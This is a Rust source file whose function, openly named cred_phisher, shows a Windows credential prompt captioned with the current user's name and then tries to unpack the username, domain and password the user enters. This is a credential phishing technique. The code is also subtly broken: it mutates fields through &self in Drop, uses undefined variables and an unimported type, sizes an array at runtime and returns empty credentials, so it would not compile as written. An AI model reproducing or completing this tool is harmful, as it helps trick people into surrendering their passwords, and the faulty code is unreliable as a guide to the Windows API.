#[allow(unused_imports)]
use extargsparse_worker::{extargs_error_class,extargs_new_error};

#[allow(unused_imports)]
use winapi::um::wincred::{CredUIPromptForWindowsCredentialsW,CredUnPackAuthenticationBufferW,CREDUI_INFOW,PCREDUI_INFOW};
#[allow(unused_imports)]
use winapi::um::combaseapi::{CoTaskMemFree};
use winapi::shared::windef::{HWND,HBITMAP};
use winapi::shared::minwindef::{DWORD,ULONG,LPVOID,BOOL,FALSE,TRUE};
use winapi::um::errhandlingapi::{GetLastError,SetLastError};

use super::wchar_windows::str_to_c_wstr;

use std::error::Error;

extargs_error_class!{CredLibError}

#[allow(non_snake_case)]
pub struct NetworkCredentials {
	pub Username :String,
	pub Password :String,
	pub Domain :String,
}

struct CoMemData {
	outbuf :LPVOID,
	outsize : ULONG,
}

impl CoMemData {
	fn new() -> CoMemData {
		CoMemData {
			outbuf : std::ptr::null_mut(),
			outsize : 0,
		}
	}
}

impl Drop for CoMemData {
	fn drop(&self) {
		if self.outbuf != std::ptr::null() {
			CoTaskMemFree(self.outbuf);
			self.outbuf = std::ptr::null_mut();
		}
		self.outsize = 0;
	}
}

struct WStrBuf {
	buffer :LPWSTR,
	bufsize : DWORD,
}

impl WStrBuf {
	fn new() -> WStrBuf {
		WStrBuf {
			buffer : std::ptr::null(),
			bufsize : 0,
		}
	}

	fn realloc(&self,size :DWORD) {
		if self.buffer != std::ptr::null() {
			std::ptr::drop_in_place(self.buffer.as_ptr());
		}
		self.buffer = std::ptr::null();
		let arr :[std::mem::MaybeUninit<u16>;size] = unsafe{ std::mem::MaybeUninit::uninit().assume_init() };
		self.buffer = arr.as_ptr();
		self.bufsize = size;
		return;
	}
}

impl Drop for WStrBuf {
	fn drop(&self) {
		if self.buffer != std::ptr::null() {
			std::ptr::drop_in_place(self.buffer.as_ptr());
		}
		self.buffer = std::ptr::null();
		self.bufsize = 0;
		return;
	}
}

pub fn cred_phisher( msg :&str) -> Result<NetworkCredentials,Box<dyn Error>> {
	let omsg = str_to_c_wstr(msg);
	if omsg.is_none() {
		extargs_new_error!{CredLibError,"can not wchar [{}]",msg}
	}
	let wmsg = omsg.unwrap();
	let username :String;
	match std::env::var("USERNAME") {
		Ok(val) => {username = format!("Please enter credential for {}",val);},
		Err(e) => {
			extargs_new_error!{CredLibError,"can not get USERNAME [{:?}]",e}
		}
	}
	let ouser = str_to_c_wstr(&username);
	if ouser.is_none() {
		extargs_new_error!{CredLibError,"can not wchar [{}]",username}	
	}
	let wusername = ouser.unwrap();
	let mut credui :CREDUI_INFOW  = CREDUI_INFOW {
		cbSize : std::mem::size_of::<CREDUI_INFOW>() as DWORD,
		hwndParent : 0 as HWND,
		pszMessageText : wmsg.as_ptr(),
		pszCaptionText : wusername.as_ptr(),
		hbmBanner : 0 as HBITMAP,
	};
	let mut authpackage : ULONG = 0;
	let dret :DWORD ;
	let mut outcomem :CoMemData = CoMemData::new();
	let mut save :BOOL = FALSE;
	let mut bret :BOOL;

	let mut userbuf :WStrBuf = WStrBuf::new();
	let mut domainbuf :WStrBuf = WStrBuf::new();
	let mut passbuf :WStrBuf = WStrBuf::new();
	let mut usersize :DWORD;
	let mut domainsize :DWORD;
	let mut passsize :DWORD;
	let mut errcode :DWORD;

	userbuf.realloc(1);
	domainbuf.realloc(1);
	passbuf.realloc(1);

	unsafe {
		dret = CredUIPromptForWindowsCredentialsW(&mut credui,0,&mut authpackage,
				std::ptr::null(),0,&mut outcomem.outbuf,&mut outcomem.outsize,&mut save,1);
		if dret != 0 {
			extargs_new_error!{CredLibError,"can not CredUIPromptForWindowsCredentialsW error [{}]", dret}
		}

		usersize = userbuf.bufsize;
		domainsize = domainbuf.bufsize;
		passsize = passbuf.bufsize;

		SetLastError(0);
		bret = CredUnPackAuthenticationBufferW(0,outbuffer,outbufsize,
			userbuf.buffer,&mut usersize,
			domainbuf.buffer,&mut domainsize,
			passbuf.buffer,&mut passsize);
		if bret == FALSE {
			errcode = GetLastError();
			extargs_new_error!{CredLibError,"can not CredUnPackAuthenticationBufferW  {}",errcode}
		}
	}

	let retv = NetworkCredentials{
		Username : "".to_string(),
		Password : "".to_string(),
		Domain : "".to_string(),
	};
	Ok(retv)
}